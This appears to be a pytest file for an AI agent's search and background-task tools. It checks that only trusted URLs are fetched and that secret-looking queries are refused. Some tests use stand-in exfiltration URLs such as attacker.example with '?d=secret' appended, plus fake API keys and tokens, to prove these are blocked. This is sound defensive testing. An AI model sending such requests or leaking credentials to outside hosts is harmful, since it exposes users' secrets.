from types import SimpleNamespace

import httpx
import pytest

from common.exceptions import ToolExecutionError
from core.agent.tools.jobs import BackgroundTaskTools
from core.agent.tools.search import SearchTools


class Tools(SearchTools, BackgroundTaskTools):
    def __init__(self, *, query="", history=(), saved=()):
        self.agent_run = SimpleNamespace(user_query=query, history=list(history))
        self.project_id, self.session_id = "project-1", "session-1"
        self.started = []
        saved_links = [{"url": url} for url in saved]

        async def list_saved_web_links(*, limit):
            return saved_links

        self.document_service = SimpleNamespace(list_saved_web_links=list_saved_web_links)

        async def start(**job):
            self.started.append(job)
            return {"job_id": "job-1", "state": "queued", "links": job["links"],
                    "session_id": None, "error_code": None,
                    "question": job["question"], "mode": job["mode"]}

        self.background_tasks = SimpleNamespace(start=start)


@pytest.mark.no_network
async def test_only_urls_from_the_user_search_pages_or_saved_links_are_known():
    tools = Tools(
        query="Summarize https://docs.example.com/guide.",
        history=[{"role": "user", "content": "see https://blog.example.com/post#top"},
                 {"role": "assistant", "content": "try https://agent-made.example.com"}],
        saved=["https://saved.example.com/page"],
    )
    tools._remember_result_urls([{"url": "https://found.example.com/a"}])

    for url in ("https://docs.example.com/guide", "https://blog.example.com/post/",
                "https://saved.example.com/page", "https://found.example.com/a"):
        assert await tools.web_url_is_known(url), url
    # The agent's own text, and a known URL with data appended, are not.
    assert not await tools.web_url_is_known("https://agent-made.example.com")
    assert not await tools.web_url_is_known("https://docs.example.com/guide?d=secret")


@pytest.mark.no_network
async def test_an_unknown_url_is_refused_before_any_request():
    requests = []
    tools = Tools()
    tools._web_page_client = httpx.AsyncClient(
        transport=httpx.MockTransport(lambda request: requests.append(request))
    )

    with pytest.raises(ToolExecutionError, match="Ask the user"):
        await tools.read_web_page("https://attacker.example/?d=secret")
    assert requests == []


@pytest.mark.no_network
async def test_a_background_task_only_receives_links_the_run_already_trusts():
    tools = Tools(query="Research https://docs.example.com/guide")

    with pytest.raises(ToolExecutionError, match="did not come from"):
        await tools.start_background_task("Find more", links=["https://attacker.example/x"])
    with pytest.raises(ToolExecutionError, match="did not come from"):
        await tools.start_background_task("Read https://attacker.example/?d=secret")
    assert tools.started == []

    await tools.start_background_task("Dig deeper", links=["https://docs.example.com/guide"])
    assert tools.started[0]["links"] == ["https://docs.example.com/guide"]


@pytest.mark.no_network
@pytest.mark.parametrize("query", [
    "why does my key sk-proj-AbCdEf0123456789abcdef fail",
    "ghp_0123456789abcdefABCDEF0123456789 permissions",
    "AKIAABCDEFGHIJKLMNOP s3 access denied",
    "token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig",
    "-----BEGIN OPENSSH PRIVATE KEY----- format",
    "value 9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a",
])
async def test_search_queries_that_look_like_they_hold_a_secret_are_not_sent(query):
    with pytest.raises(ToolExecutionError, match="key or token"):
        await Tools().search_web(query)


@pytest.mark.no_network
@pytest.mark.parametrize("query", [
    "ValueError: invalid literal for int() with base 10",
    "state-of-the-art-2024-machine-learning-models comparison",
    "550e8400-e29b-41d4-a716-446655440000 uuid format",
    "https://docs.example.com/guide/getting-started-with-version-2024 summary",
])
async def test_ordinary_search_queries_pass_the_secret_check(query):
    from core.agent.tools.search import _refuse_secret_like_query

    _refuse_secret_like_query("search_web", query)  # does not raise
